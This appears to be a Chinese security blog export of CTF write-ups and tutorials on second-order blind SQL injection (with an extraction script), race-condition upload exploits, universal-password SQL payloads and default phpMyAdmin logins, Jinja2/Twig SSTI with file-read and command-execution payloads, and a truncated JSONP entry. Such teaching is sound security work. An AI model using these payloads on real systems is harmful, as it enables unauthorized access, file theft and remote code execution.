SimpleBlog题目，简单的blog,然后在classes给提示说是二次注入，一翻尝试之后无果，最后大佬给的思路，注意主页的提示注意0分，final exam提交答卷会随机给一个成绩，既然说二次注入，会不会是看成绩的时候会把用户名啥的代入到数据库中，因为提交答卷分数插入到数据库，这里可能造成二次注入，即然这样那注入点就在用户名上面了，不断注册查看是否等于0，后来看wp晓得，当成绩为0时说明逻辑错误，不为0则逻辑正常。 然后注册 账号为 1’ or 1=1 or ‘ 账号这里有几个点着重说一下 前面的1要单引号闭合，这句逻辑账号有三个语句要判断，第一个1’ 数据库中可能要查询啥不清楚后端代码，这里判断是错的，or 1=1 这个语句是对的， or’ 闭合语句这句也逻辑也是错的，所以我们 or判断只要是对的 那么分数查询那里就会是有分，否则就是0分。 现在就可写脚本进行检测，首先确定好自己的 注入语句，这里是无法通过回显来注入的，所以我们通过布尔盲注写脚本。 语句 zpq’ or ascii(substr((select flag from flag limit 0,1),1,1))&gt;1 or ‘ 查看效果 语句 zpq’ or ascii(substr((select flag from flag limit 0,1),1,1))&gt;1000 or ‘ 这句 肯定为错，因为ascii码不可能大于1000 可以看到 返回为0说明是错误的，语句已经完成接下来就写个脚本跑出flag。 import requests import re headers = { &apos;Connection&apos;: &apos;close&apos;, }//防多次访问断开连接 flag=&quot;&quot; for i in range(1,32): for nmb in range(32,126): payload={&apos;username&apos;:&quot;zpq888&apos; or ascii(substr((select flag from flag limit 0,1),%s,1))=%s or&apos;&quot;%(i,nmb),&apos;password&apos;:&quot;123&quot;} s=requests.Session() url_reg=&apos;http://210.32.4.20/register.php&apos; r=s.post(url_reg,data=payload,headers=headers) url_log=&apos;http://210.32.4.20/login.php&apos; r=s.post(url_log,data=payload,headers=headers) url_ans=&apos;http://210.32.4.20/answer.php&apos; select={&apos;1.a&apos;:&apos;on&apos;} r=s.post(url_ans,data=select,headers=headers) result=r.content[2074:2075] if int(result)!=0: flag=flag+chr(nmb) print flag break 单线程太慢不跑了！]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CTF中的条件竞争漏洞]]></title>
    <url>%2F2018%2F11%2F15%2F%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[条件竞争是沃特？敲黑板，定义：竞争条件发生在多个线程同时访问同一个共享代码、变量、文件等没有进行锁操作或者同步操作的场景中。 开发者在进行代码开发时常常倾向于认为代码会以线性的方式执行，而且他们忽视了并行服务器会并发执行多个线程，这就会导致意想不到的结果。线程同步机制确保两个及以上的并发进程或线程不同时执行某些特定的程序段，也被称之为临界区（critical section），如果没有应用好同步技术则会发生“竞争条件”问题。 形象实例#抽象成四个字，措手不及！！！ 利用多线程并发去执行同一个操作进程，服务器无法或者没有处理程序，导致处理高并发的线程未能同步好所有请求，导致请求与请求之间产生等待时出现逻辑缺陷。出现意想不到的结果，措手不及应接不暇人山人…咳咳，反应不过来就出错。 该漏洞一般出现在与数据库系统频繁交互的位置，例如金额同步、支付等较敏感操作处。另外条件竞争漏洞也会出现在其他位置，例如文件的操作处理等。 给两个例子好好消化消化。 例1：金额提现 假设现有一个用户在系统中共有2000元可以提现，他想全部提现。于是该用户同时发起两次提现请求，第一次提交请求提现2000元，系统已经创建了提现订单但还未来得及修改该用户剩余金额，此时第二次提现请求同样是提现2000元，于是程序在还未修改完上一次请求后的余额前就进行了余额判断，显然如果这里余额判断速度快于上一次余额修改速度，将会产生成功提现的两次订单，而数据库中余额也将变为-2000。而这产生的后果将会是平台多向该用户付出2000元。 例2：先存储文件，再判断是否合法，然后再删除。 首先将文件上传到服务器，然后检测文件后缀名，如果不符合条件，就删掉，典型的“引狼入室”攻击：首先上传一个php文件当然这个文件会被立马删掉，所以我们使用多线程并发的访问上传的文件，总会有一次在上传文件到删除文件这个时间段内访问到上传的php文件，一旦我们成功访问到了上传的文件，那么它就会向服务器写一个shell。 乌云实例：http://wooyun.jozxing.cc/static/bugs/wooyun-2014-049794.html 乌云人民币套现：http://wooyun.jozxing.cc/static/bugs/wooyun-2015-099622.html CTF实例https://blog.csdn.net/iamsongyu/article/details/83346029 //Itshop辣条之王 知识点1.条件竞争 2.数据溢出数据溢出重点一句话：我们输入的是份数，后台肯定要查询数据库中我们的大辣条数目书否符合条件，即是否大于份数*5，才会给我们相应的辣条之王。我们的目的是数据库判断可以过，但是后台也得给我们足够的辣条之王，思路是使用整数溢出欺骗数据库，（重中）使得我们请求的数字在服务器看来就是1分辣条之王，而实际上是很多。（之重！） ctf题目：http://119.23.73.3:5006/web2/index2.php （练习） 首先进入CTF地址，观察发现，网址为inde2.php，正常来说应是index.php，访问index.php发现自动跳转 inde2.php抓包截包，进入 uploadsomething.php，发现应该是个上传页面，第一个框为上传文件名，第二个为文件内容，上传1.php ，返回路径 查看凭我专业八级的英语水平，这意思应该是太慢了，于是聪明的你想到的条件竞争漏洞，迅速上传迅速访问。OK，使用burp intruder 模块 爆破上传，然后访问。 于是，开始， 分别抓取两个包发送intruder第一个包网址：http://119.23.73.3:5006/web2/uploadsomething.php?filename=1.php&amp;content=&lt;?php+system(“ls”);?&gt;第二个包网址：http://119.23.73.3:5006/web2/uploads/c2a54d18d324f0c9b33b29243f77d3a45b5f9463/1.php 调整没有字典的爆破，不断发包， 然后设置发送三千个数据包，然后设置线程调至50 第一个包为以50线程迅速上传三千次，第二个包为以50线程迅速访问三千次，只要速度够快就可以访问到。然后开始爆破成功得到flag，我们可以看到也不是百分百可以得到flag，存在竞争， 防御对于数据库的操作，正牌的方法是设置锁 对于文件上传，一定要经过充分完整的检查之后再上传而不是先上传在辨别。 参考：https://blog.csdn.net/ivalue/article/details/81412494参考：https://www.0dayhack.com/post-666.html]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CTF-WEB知识点保存]]></title>
    <url>%2F2018%2F11%2F14%2FCTF-web%2F</url>
    <content type="text"><![CDATA[nginx 配置不当导致目录遍历下载漏洞http://www.cnblogs.com/Mrsm1th/p/6600876.html php:input代码执行以及php://filter读取源码https://www.ichunqiu.com/writeup/detail/481 一道python简单编写–保持session情况下爆破https://www.ichunqiu.com/writeup/detail/345 附脚本 import requests url=&apos;http://ffefac91283449f885270558d30fea4476d8e21e00254600.game.ichunqiu.com/?value[]=ea&apos; s=requests.session()//一个要点必须保持session一致否则销毁了之后无法叠加十次。 r=s.get(url) for i in range(0,20): url=&quot;http://ffefac91283449f885270558d30fea4476d8e21e00254600.game.ichunqiu.com/?value[]=&quot;+r.content[0:2] r=s.get(url) print r.content[0:44] PHP超全局变量CTFhttps://www.ichunqiu.com/writeup/detail/717]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[web漏洞之弱口令]]></title>
    <url>%2F2018%2F11%2F11%2Fweb%E6%BC%8F%E6%B4%9E%E5%BC%B1%E5%8F%A3%E4%BB%A4%2F</url>
    <content type="text"><![CDATA[前言：将web漏洞中万能密码也归类于弱口令篇。 1.phpmyadminphpmyadmin万能密码其实应该叫phpmyadmin万能账号，因为是在帐号处输入漏洞信息，而密码不需要输入 用户名处写入‘localhost‘@‘@”则登录成功，密码无需输入 (全部为英文标点符号) phpmyadmin 爆绝对路径 phpMyAdmin/libraries/select_lang.lib.php phpMyAdmin/darkblue_orange/layout.inc.php phpMyAdmin/index.php?lang[]=1 phpmyadmin/themes/darkblue_orange/layout.inc.php 漏洞影响版本 2.11.4 ， 2.11.3 phpmyadmin弱口令phpMyAdmin默认账号密码用户名 root密码 root或空登陆。 phpmyadmin root空密码 用户名 root 登陆，无需密码。 漏洞影响版本 2.11.9.2 2.web后台站万能密码 admin&apos;or&apos;1&apos;=&apos;1 &apos;UNION SELECT 1, &apos;anotheruser&apos;, &apos;doesnt matter&apos;, 1– &quot;or&quot;a&quot;=&quot;a &apos;xor &apos;or&apos;=&apos;or&apos; （asp、aspx的万能密码） 1：&quot;or &quot;a&quot;=&quot;a 2：&apos;)or(&apos;a&apos;=&apos;a 3：&apos;or&apos;=&apos;or&apos; 4：&apos;or 1=1– 5：a&apos;or&apos; 1=1– 6：&quot;or 1=1– 7：&apos;or&apos;a&apos;=&apos;a 8：&quot;or&quot;=&quot;a&apos;=&apos;a 9：&apos;or&quot;=&apos; 10：admin&apos;or&apos;1=1 11:1 or &apos;1&apos;=&apos;1&apos;=1 12:1 or &apos;1&apos;=&apos;1&apos; or 1=1 13:&apos;OR 1=1%00 14:&apos;or 1=1%00 15:&apos;xor &apos;or&apos;=&apos;or&apos; （PHP的万能密码） or 1=1/* User：something Pass：OR 1=1 （jsp的万能密码） 1or1=1 admin OR 1=1/* xpath注入万能密码 &quot;or 1=1 or &quot;=&apos; 万能密码原理： 由于一些网站后台输入账号密码未进行字符过滤导致sql注入万能密码如下为 登陆源码语句select * from user where username=’$user’ and password =’$pass’ 输入万能密码 ‘or’1’=’1select * from user where username=’’or ‘1’=’1’ and password =’’ or’1’=’1’ 可以看到 or 直接绕过，使得判断逻辑语句一直为真，对于一些代码可以进行绕过万能密码进入后台，这样SQL返回的值始终为1，就成功绕过了程序的验证。]]></content>
      <tags>
        <tag>web漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SSTI模板注入]]></title>
    <url>%2F2018%2F11%2F11%2FSSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[前言开局一张图，姿势全靠yy 模板引擎可以让（网站）程序实现界面与数据分离，业务代码与逻辑代码的分离，这大大提升了开发效率，良好的设计也使得代码重用变得更加容易。与此同时，它也扩展了黑客的攻击面。除了常规的 XSS 外，注入到模板中的代码还有可能引发 RCE（远程代码执行）。通常来说，这类问题会在博客，CMS，wiki 中产生。虽然模板引擎会提供沙箱机制，攻击者依然有许多手段绕过它。 和常见Web注入的成因一样，也是服务端接收了用户的输入，将其作为 Web 应用模板内容的一部分，在进行目标编译渲染的过程中，执行了用户插入的恶意内容，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性。 小课堂—模板渲染是what？首先 模板渲染分解为前端渲染和后端渲染，还有浏览器渲染。 模板只是一种提供给程序来解析的一种语法，换句话说，模板是用于从数据（变量）到实际的视觉表现（HTML代码）这项工作的一种实现手段，而这种手段不论在前端还是后端都有应用。 通俗点理解：拿到数据，塞到模板里，然后让渲染引擎将赛进去的东西生成 html 的文本，返回给浏览器，这样做的好处展示数据快，大大提升效率。 后端渲染 后端渲染HTML的情况下，浏览器会直接接收到经过服务器计算之后的呈现给用户的最终的HTML字符串，这里的计算就是服务器经过解析存放在服务器端的模板文件来完成的，在这种情况下，浏览器只进行了HTML的解析，以及通过操作系统提供的操纵显示器显示内容的系统调用在显示器上把HTML所代表的图像显示给用户。 实现：后端拼字符串呗…… （理论上后端模板也是字符串） 好处：模板统一在后端。前端（相对）省事，不占用客户端运算资源（解析模板），只要不大改结构，文字啥的小修改后端改了就好了。 坏处：占用（部分、少部分）服务器运算资源、，response 出的数据量会（稍）大点，模板改了前端的交互和样式什么的一样得跟着联动修改。 前端渲染 前端渲染就是指浏览器会从后端得到一些信息，这些信息或许是适用于题主所说的angularjs的模板文件，亦或是JSON等各种数据交换格式所包装的数据，甚至是直接的合法的HTML字符串。这些形式都不重要，重要的是，将这些信息组织排列形成最终可读的HTML字符串是由浏览器来完成的，在形成了HTML字符串之后，再进行显示。 好处：不占用服务端运算资源（解析模板），模板在前端（很有可能仅部分在前端），改结构变交互都前端自己来了，改完自己调就行。不用麻烦后端再联调神马的。 坏处：占用（一部分、少部分）客户端运算资源（解析模板）。前端代码多点，毕竟包含模板代码了么。脚本是不是首次下就慢点了（看你在意不在意这个毕竟能304和CDN啥的）。可能造成前后两份模板的情况，总归要后端吐出个首屏啥的先让用户看见吧。那这部分页面模板不就是后端拼好了吐出来的么。 示例1：定义一个模板，例如 &lt;html&gt; &lt;div&gt;{$what}&lt;/div&gt; &lt;/html&gt; 这只是一个模板。{$what}是数据。此时不知道数据是什么。 如果我想html里面成为 &lt;div&gt;peiqi&lt;/div&gt; 渲染到html代码里 渲染完成后 &lt;html&gt; &lt;div&gt;peiqi&lt;/div&gt; &lt;/html&gt; 当然这只是最简答的例子；一般来说，至少会提供分支，迭代。还有一些内置函数，如格式化等等那么 {$what}这个数据如何代码传入。比如我工作用的模板引擎是smarty我定义了一个模板。 &lt;html&gt; &lt;div&gt;{$what}&lt;/div&gt; &lt;/html&gt; js代码就是这么写就可以了 var tpl= new jSmart(tplStr);//tplStr就是模板的字符串。 var content = &quot;Hello World&quot;; tpl.fetch({what:content}); 这样就可以了其余的就交给引擎去渲染执行了。 示例2：模板：front.tpl &lt;div&gt; {%$a%} &lt;/div&gt; 后端： 设置变量：$smarty-&gt;assign(‘a’, ‘give data’);展示模板：$smarty-&gt;display(“front.tpl”);到前端时是渲染好的html串： &lt;div&gt; give data &lt;/div&gt; 这种方式的特点是展示数据快，直接后端拼装好数据与模板，展现到用户面前。 为什么需要服务器模板首先解释一下为什么HTML代码和应用程序逻辑混合在一起不好，看下面的例子你就知道了。假如你使用下面的代码为你的用户提供服务： 这不仅仅是静态HTML代码。用户名是从cookie里获取并且自动填写的。这样一来，只要你之前登录过该网站，你就无需再次输入。但是这有一个问题，那就是你必须通过某种形式将值插入到HTML文档中，有两种方法可以实现，一种是正确的，一种是有危害的。不过我们要先问一下，为什么要这么做。下图展示了解决该问题的完全错误的方法： 这段代码有很多问题，作者不仅仅没有对用户的输入进行处理，HTML代码和PHP代码复杂的混合在一起，非常难以理解。部分HTML代码分布在多个函数中，这还不算什么，当你尝试修改HTML代码中任何内容时，你才发现有多难受，比如新增css类或修改HTML标签的顺序。 上面这个例子显然是有意写的这么烂的，不过可以通过格式化进行优化。然而，在大型的代码库中，即使代码格式良好，也会很快变得无法管理。这就是为什么我们需要模板。 与上面混乱的代码相比，服务器端模板提供了一种更加简单的方法来管理动态生成的HTML代码。最大的优点就是你可以在服务器端动态生成HTML页面，看起来跟静态HTML页面一样。现在我们来看看，当我们使用服务器端模板时，复杂的代码看起来如何。 这对前面的代码做了一些优化，它依然是静态的。为了显示正确的信息而不是大括号占位符，我们需要一个替换它们的模板引擎。后端代码可能是这样的。 这段代码的意思非常清楚，首先加载login.tpl模板文件，然后对与模板中名称相同的变量赋值（大括号里的变量），然后调用show()函数，相应的替换它们的内容并输出HTML代码。然而，我们在模板中增加了新的功能，这将会向用户展示模板渲染的时间。 什么是服务端模板注入通过模板，Web应用可以把输入转换成特定的HTML文件或者email格式。就拿一个销售软件来说，我们假设它会发送大量的邮件给客户，并在每封邮件前SKE插入问候语，它会通过Twig（一个模板引擎）做如下处理： $output = $twig-&gt;render( $_GET[‘custom_email’] , array(“first_name” =&gt; $user.first_name) );有经验的读者可能迅速发现 XSS，但是问题不止如此。这行代码其实有更深层次的隐患，假设我们发送如下请求： custom_email={{7*7}} // GET 参数 49 // $output 结果 还有更神奇的结果： custom_email={{self}} // GET 参数 Object of class __TwigTemplate_7ae62e582f8a35e5ea6cc639800ecf15b96c0d6f78db3538221c1145580ca4a5 could not be converted to string // 错误 我们不难猜到服务器执行了我们传过去的数据。每当服务器用模板引擎解析用户的输入时，这类问题都有可能发生。除了常规的输入外，攻击者还可以通过 LFI（文件包含）触发它。模板注入和 SQL 注入的产生原因有几分相似——都是将未过滤的数据传给引擎解析。 为什么我们在模板注入前加“服务端”呢？这是为了和 jQuery，KnockoutJS 产生的客户端模板注入区别开来。通常的来讲，前者甚至可以让攻击者执行任意代码，而后者只能 XSS。 注入原理&lt;?php require_once dirname(__FILE__).&apos;/../lib/Twig/Autoloader.php&apos;; Twig_Autoloader::register(true); $twig = new Twig_Environment(new Twig_Loader_String()); $output = $twig-&gt;render(&quot;Hello {{name}}&quot;, array(&quot;name&quot; =&gt; $_GET[&quot;name&quot;])); // 将用户输入作为模版变量的值 echo $output; ?&gt; 使用 Twig 模版引擎渲染页面，其中模版含有 变量，其模版变量值来自于 GET 请求参数 $_GET[“name”]。 显然这段代码并没有什么问题，即使你想通过 name 参数传递一段 JavaScript 代码给服务端进行渲染，也许你会认为这里可以进行 XSS， 但是由于模版引擎一般都默认对渲染的变量值进行编码和转义，所以并不会造成跨站脚本攻击： 但是，如果渲染的模版内容受到用户的控制，情况就不一样了。修改代码为： &lt;?php require_once dirname(__FILE__).&apos;/../lib/Twig/Autoloader.php&apos;; Twig_Autoloader::register(true); $twig = new Twig_Environment(new Twig_Loader_String()); $output = $twig-&gt;render(&quot;Hello {$_GET[&apos;name&apos;]}&quot;); // 将用户输入作为模版内容的一部分 echo $output; ?&gt; 上面这段代码在构建模版时,拼接了用户输入作为模板的内容,现在如果再向服务端直接传递 JavaScript 代码,用户输入会原样输出,测试结果显而易见。 在 Twig 模板引擎里, 除了可以输出传递的变量以外,还能执行一些基本的表达式然后将其结果作为该模板变量的值,例如这里用户输入 name=20 ,则在服务端拼接的模版内容为: 这里简单分析一下,由于 作为 Twig 模板引擎的默认注释形式,所以在前端输出的时候并不会显示,而 16 作为模板变量最终会返回 16 作为其值进行显示,因此前端最终会返回内容 Hello IsVuln16OK ,如下图: 漏洞发掘每一个（重）模板引擎都有着自己的语法（点）,Payload 的构造需要针对各类模板引擎制定其不同的扫描规则,就如同 SQL 注入中有着不同的数据库类型一样。 简单来说,就是更改请求参数使之承载含有模板引擎语法的 Payload,通过页面渲染返回的内容检测承载的 Payload 是否有得到编译解析,有解析则可以判定含有 Payload 对应模板引擎注入,否则不存在 SSTI。 模板语言的语法和 HTML 语法相差甚大，因此我们可以用其独特的语法来探测漏洞。虽然各种模板的实现细节不大一样，不过它们的基本语法大致相同，我们可以发送如下 payload： smarty=Hello ${7*7} Hello 49 freemarker=Hello ${7*7} Hello 49 来确认漏洞。 在一些环境下，用户的输入也会被当作模板的可执行代码。比如说变量名： personal_greeting=username Hello user01 这种情况下，XSS 的方法就无效了。但是我们可以通过破坏 template 语句，并附加注入的HTML标签以确认漏洞： personal_greeting=username&lt;tag&gt; Hello personal_greeting=username}}&lt;tag&gt; Hello user01 &lt;tag&gt; 但是，如果渲染的模版内容受到用户的控制，情况就不一样了。修改代码为： &lt;?php require_once dirname(__FILE__).&apos;/../lib/Twig/Autoloader.php&apos;; Twig_Autoloader::register(true); $twig = new Twig_Environment(new Twig_Loader_String()); $output = $twig-&gt;render(&quot;Hello {$_GET[&apos;name&apos;]}&quot;); // 将用户输入作为模版内容的一部分 echo $output; ?&gt; 上面这段代码在构建模版时,拼接了用户输入作为模板的内容,现在如果再向服务端直接传递 JavaScript 代码,用户输入会原样输出,测试结果显而易见。 模板引擎注入模板引擎（这里特指用于Web开发的模板引擎）是为了使用户界面与业务数据（内容）分离而产生的，它可以生成特定格式的文档，用于网站的模板引擎就会生成一个标准的HTML文档。 一些模板引擎：Smarty，Mako，Jinja2，Jade，Velocity，Freemaker和Twig，模板注入是一种注入攻击，可以产生一些特别有趣的影响。对于AngularJS的情况，这可能意味着XSS，并且在服务器端注入的情况下可能意味着远程代码执行。 重点来了，不同引擎有不同的测试以及注入方式！ flask/jinja2模板注入Flask是一个使用 Python 编写的轻量级 Web 应用框架。其 WSGI 工具箱采用 Werkzeug ，模板引擎则使用 Jinja2 Flask框架中提供的模版引擎可能会被一些无量开发者利用引入一个服务端模版注入漏洞，如果对此感到有些困惑可以看看James Kettle在黑帽大会中分享的议题(PDF)，简而言之这个漏洞允许将语言/语法注入到模板中。在服务器的context中执行这个输入重现，根据应用的context可能导致任意远程代码执行(远端控制设备)可以参考本博客文章 Flask从零到无 。这里给出一个漏洞环境代码，本地测试 from flask import Flask from flask import render_template from flask import request from flask import render_template_string app = Flask(__name__) @app.route(&apos;/test&apos;,methods=[&apos;GET&apos;, &apos;POST&apos;]) def test(): template = &apos;&apos;&apos; &lt;div class=&quot;center-content error&quot;&gt; &lt;h1&gt;Oops! That page doesn&apos;t exist.&lt;/h1&gt; &lt;h3&gt;%s&lt;/h3&gt; &lt;/div&gt; &apos;&apos;&apos; %(request.url) return render_template_string(template) if __name__ == &apos;__main__&apos;: app.debug = True app.run() 代码简析： 我们自己简单写一个string类型的 html，html返回当前url，我们放入到渲染函数render_template_string进行渲染，然后页面会打印出当前url，如果url里含有｛｝那么便可以进行模板注入。 测试url http://127.0.0.1:5000/test?{{config}} 测试结果如下： 而如果我们使用render_template函数， @app.route(&apos;/&apos;,methods=[&apos;GET&apos;, &apos;POST&apos;]) @app.route(&apos;/index&apos;,methods=[&apos;GET&apos;, &apos;POST&apos;])#我们访问/或者/index都会跳转 def index(): return render_template(&quot;index.html&quot;,title=&apos;Home&apos;,user=request.args.get(&quot;key&quot;)) index.html &lt;html&gt; &lt;head&gt; &lt;title&gt;{{title}} - 小猪佩奇&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;Hello, {{user}}!&lt;/h1&gt; &lt;/body&gt; &lt;/html&gt; 那么将不会有模板注入，因为render_template已经传入一个固定好了的模板，没法再去修改，在渲染之后传入数据，只有当第一种代码，我们模板可控的时候，先传入后渲染，这样才会导致ssti模板注入。 ctf tips1.那么实战ctf中如何利用呢，无非是读取文件或者getshell， Python中有一个 .class 可以获取实例对应的类，比如一个空字符串 “”.class就可以获取到 ，那这个字符串同样也可以换成列表，元组，字典。 “”同样可以换成元组，列表等。 print ().__class__.__bases__[0] &lt;type &apos;object&apos;&gt; 可以看到元组的父类为object类，object是所有类的超类，而他之下又有很多方法可以调用，包括file 读取，system os等方法，我们再查看他之下的方法，然后找到对应的位置去调用。重点是将boject类找到，然后subclasses找他的方法，再从方法中找到合适的来读取或执行命令。如下poc， ().__class__.__bases__[0].__subclasses__() 因为().class.bases__为object类，所以我们直接subclasses查找方法，如果不是object类，则进一步base，().class.bases[0].subclasses()如下poc， poc http://127.0.0.1:5000/test?{{session['__cla'+'ss__'].__bases__[0].__bases__[0].__bases__[0].__bases__[0]}} 已经找到了object类然后进行下一步方法利用就可以了。从这些方法中选去可利用的进行下一步渗透。如第四十个为方法，我们调用方法读取poc： http://127.0.0.1:5000/test?{{().__class__.__bases__[0].__subclasses__()[40](r'/etc/passwd').read()}} 2.执行命令poc ().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13][&apos;eval&apos;](&apos;__import__(&quot;os&quot;).popen(&quot;ls /var/www/html&quot;).read()&apos; ) object.__subclasses__()[59].__init__.func_globals[&apos;linecache&apos;].__dict__[&apos;o&apos;+&apos;s&apos;].__dict__[&apos;sy&apos;+&apos;stem&apos;](&apos;ls&apos;) www.a.com/login.php{{request['__cl'+'ass__'].__base__.__base__.__base__['__subcla'+'sses__']()[60]['__in'+'it__']['__'+'glo'+'bal'+'s__']['__bu'+'iltins__']['ev'+'al']('__im'+'port__("os").po'+'pen("ca"+"t a.php").re'+'ad()')}} init用于将对象实例化 其他的利用方式无非都是这个格式，方法自己去寻找， 3.绕过（参考https://p0sec.net/index.php/archives/120/）ctf中不免有一些函数会被过滤，我们可以通过拼接字符串的方式来绕过如 poc object.__subclasses__()[59].__init__.func_globals[&apos;linecache&apos;].__dict__[&apos;o&apos;+&apos;s&apos;].__dict__[&apos;sy&apos;+&apos;stem&apos;](&apos;ls&apos;) 括号里的字符都可以通过’a’+’a’的方式来组合，组合后为aa，以此来绕过 getattribute绕过 我们想要的代码 ().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13] 进行关键字绕过 ().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__(&apos;func_global&apos;+&apos;s&apos;)[&apos;linecache&apos;] 两个不常见的执行任意命令的方法： import timeittimeit.timeit(“import(‘os’).system(‘dir’)”,number=1) import platformprint platform.popen(‘dir’).read() 走投无路时的poc https://evi0s.com/2018/11/26/%E6%B7%B1%E5%85%A5ssti-%E4%BB%8Enctf2018%E4%B8%A4%E9%81%93flask%E7%9C%8Bbypass%E6%96%B0%E5%A7%BF%E5%8A%BF/ 参考文章：https://blog.csdn.net/iamsongyu/article/details/83109772参考文章：https://www.freebuf.com/articles/web/88768.html参考文章：https://www.freebuf.com/articles/web/98928.html flask本地实战讲解环境 python3.6模版 flask引擎 jinja2源码 from flask import Flask from flask import render_template_string from flask import request app = Flask(__name__) @app.route(&apos;/test&apos;,methods=[&apos;GET&apos;, &apos;POST&apos;]) def test(): template = &apos;&apos;&apos; &lt;div class=&quot;center-content error&quot;&gt; &lt;h1&gt;Oops! That page doesn&apos;t exist.&lt;/h1&gt; &lt;h3&gt;%s&lt;/h3&gt; &lt;/div&gt; &apos;&apos;&apos; %(request.url) return render_template_string(template) if __name__ == &apos;__main__&apos;: app.run() 1.先找object类，这里我们没采用常规的””.class而是用session[class] http://127.0.0.1:5000/test?{{session['__cla'+'ss__'].__bases__[0].__bases__[0].__bases__[0].__bases__[0]}}//至于这里为啥&apos;__cla&apos;+&apos;ss__&apos;是为了绕过一些过滤防患未然。 如图我们找到了object类，然后从中找我们熟悉的类再找函数，接下来我们subclasses找到所有的类，我们找熟悉的类 查找查找回首掏，第118个常规.init.globals找到popen函数，执行命令最终poc http://127.0.0.1:5000/test?{{session['__cla'+'ss__'].__bases__[0].__bases__[0].__bases__[0].__bases__[0].__subclasses__()[118].__init__.__globals__['popen']('dir').read()}} 执行命令 PHP/模版引擎Twig注入参考：https://www.freebuf.com/vuls/83999.html CTF—模板注入tornado的一道 ssti https://blog.csdn.net/cccccfive/article/details/83145669 防御为了防止此类漏洞，你应该像使用eval()函数一样处理字符串加载功能。尽可能加载静态模板文件。 注意：我们已经确定此功能类似于require()函数调用。因此，你也应该防止本地文件包含（LFI）漏洞。不要允许用户控制此类文件或其内容的路径。 另外，无论在何时，如果需要将动态数据传递给模板，不要直接在模板文件中执行，你可以使用模板引擎的内置功能来扩展表达式，实现同样的效果。 附表参考：https://www.anquanke.com/post/id/82856参考：https://zhuanlan.zhihu.com/p/28823933参考：https://www.cnblogs.com/tyomcat/p/5440488.html]]></content>
      <tags>
        <tag>渗透攻防</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[json及jsonp注入]]></title>
    <url>%2F2018%2F11%2F05%2Fjsonp%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[json以及jsonp前言JSONP全名为JSON with Padding，其存在的意义便有绕过诸如同源策略强制执行XMLHttpRequest(AJAX requests)。是基于 JSON 格式的为解决跨域请求资源而产生的解决方案。他实现的基本原理是利用了 HTML 里 元素标签，远程调用 JSON 文件来实现数据传递。如要在 a.com 域下获取存在 b.com 的 JSON 数据( getUsers.JSON ): JSONP(JSON with Padding)是一个非官方的协议，它允许在服务器端集成Script tags返回至客户端，通过javascript callback的形式实现跨域访问（这仅仅是JSONP简单的实现形式）。 JSONP注入是一个不太常见但影响非常广泛且极危险的漏洞，由于最近几年对JSON, web APIs以及跨域通信的需求增多，不得不引起我们的重视。 json基础JSON能够以非常简单的方式来描述数据结构，XML能做的它都能做，因此在跨平台方面两者完全不分伯仲。1、JSON只有两种数据类型描述符，大括号{}和方括号[]，其余英文冒号:是映射符，英文逗号,是分隔符，英文双引号”“是定义符。2、大括号{}用来描述一组“不同类型的无序键值对集合”（每个键值对可以理解为OOP的属性描述），方括号[]用来描述一组“相同类型的有序数据集合”（可对应OOP的数组）。3、上述两种集合中若有多个子项，则通过英文逗号,进行分隔。4、键值对以英文冒号:进行分隔，并且建议键名都加上英文双引号”“，以便于不同语言的解析。5、JSON内部常用数据类型无非就是字符串、数字、布尔、日期、null 这么几个，字符串必须用双引号引起来，其余的都不用，日期类型比较特殊，这里就不展开讲述了，只是建议如果客户端没有按日期排序功能需求的话，那么把日期时间直接作为字符串传递就好，可以省去很多麻烦。 json实例// 描述一个人 var person = { &quot;Name&quot;: &quot;Bob&quot;, &quot;Age&quot;: 32, &quot;Company&quot;: &quot;IBM&quot;, &quot;Engineer&quot;: true } // 获取这个人的信息 var personAge = person.Age; // 描述几个人 var members = [ { &quot;Name&quot;: &quot;Bob&quot;, &quot;Age&quot;: 32, &quot;Company&quot;: &quot;IBM&quot;, &quot;Engineer&quot;: true }, { &quot;Name&quot;: &quot;John&quot;, &quot;Age&quot;: 20, &quot;Company&quot;: &quot;Oracle&quot;, &quot;Engineer&quot;: false }, { &quot;Name&quot;: &quot;Henry&quot;, &quot;Age&quot;: 45, &quot;Company&quot;: &quot;Microsoft&quot;, &quot;Engineer&quot;: false } ] // 读取其中John的公司名称 var johnsCompany = members[1].Company; // 描述一次会议 var conference = { &quot;Conference&quot;: &quot;Future Marketing&quot;, &quot;Date&quot;: &quot;2012-6-1&quot;, &quot;Address&quot;: &quot;Beijing&quot;, &quot;Members&quot;: [ { &quot;Name&quot;: &quot;Bob&quot;, &quot;Age&quot;: 32, &quot;Company&quot;: &quot;IBM&quot;, &quot;Engineer&quot;: true }, { &quot;Name&quot;: &quot;John&quot;, &quot;Age&quot;: 20, &quot;Company&quot;: &quot;Oracle&quot;, &quot;Engineer&quot;: false }, { &quot;Name&quot;: &quot;Henry&quot;, &quot;Age&quot;: 45, &quot;Company&quot;: &quot;Microsoft&quot;, &quot;Engineer&quot;: false } ] } // 读取参会者Henry是否工程师 var henryIsAnEngineer = conference.Members[2].Engineer; 什么是jsonp1、一个众所周知的问题，Ajax直接请求普通文件存在跨域无权限访问的问题，甭管你是静态页面、动态网页、web服务、WCF，只要是跨域请求，一律不准； 2、不过我们又发现，Web页面上调用js文件时则不受是否跨域的影响（不仅如此，我们还发现凡是拥有”src”这个属性的标签都拥有跨域的能力，比如script、img、iframe）； 